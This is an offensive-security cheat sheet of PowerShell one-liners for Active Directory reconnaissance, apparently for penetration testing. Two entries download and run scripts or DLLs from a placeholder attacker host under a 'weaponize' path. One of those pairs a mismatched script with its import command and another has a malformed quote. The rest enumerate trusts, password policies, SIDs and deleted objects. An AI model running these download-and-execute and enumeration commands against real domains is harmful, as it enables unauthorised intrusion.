# pwsh
% windows, Active Directory, powershell

#plateform/windows #target/local #cat/RECON/AD #tag/powershell 


## AD - Install the AD Module
```
Get-WindowsCapability -Name RSAT*ActiveDirectory* -Online | Add-WindowsCapability -Online;gci -Path 'C:\Windows' -Recurse -Filter 'Microsoft.ActiveDirectory.Management.dll' -EA SilentlyContinue | ? {$_.FullName -like '*GAC_64*' -or $_.FullName -like '*amd64*'} | select -Expand FullName
```

## AD - load AD Module from http (PS1)
https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1
```
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/windows/windows_weaponize/ps/PrivescCheck.ps1') | IEX; Import-ActiveDirectory
```

## AD - load AD Module from http (dll)
```
(New-Object System.Net.WebClient).DownloadFile('http://<local_ip>:<port|80>/windows/windows_weaponize/dll/Microsoft.ActiveDirectory.Management.dll', '<windows_writable_path>\Microsoft.ActiveDirectory.Management.dll)' | IEX; Import-Module <path>\Microsoft.ActiveDirectory.Management.dll; Get-Command -Module Microsoft.ActiveDirectory.Management
```

## AD - get current DC
```
$env:LOGONSERVER
```

## AD - get password policy (user)
```
Get-ADUserResultantPasswordPolicy -Identity <user>
```

## AD - get password policy (default)
```
Get-ADDefaultDomainPasswordPolicy
```

## AD - show forest trust
```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

## AD - Get domain trust
```powershell
Get-DomainTrust -Domain <domain>
```

## AD - Get domain SID
```powershell
Get-DomainSID -domain <sid>
```

## AD - Get trash object
```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

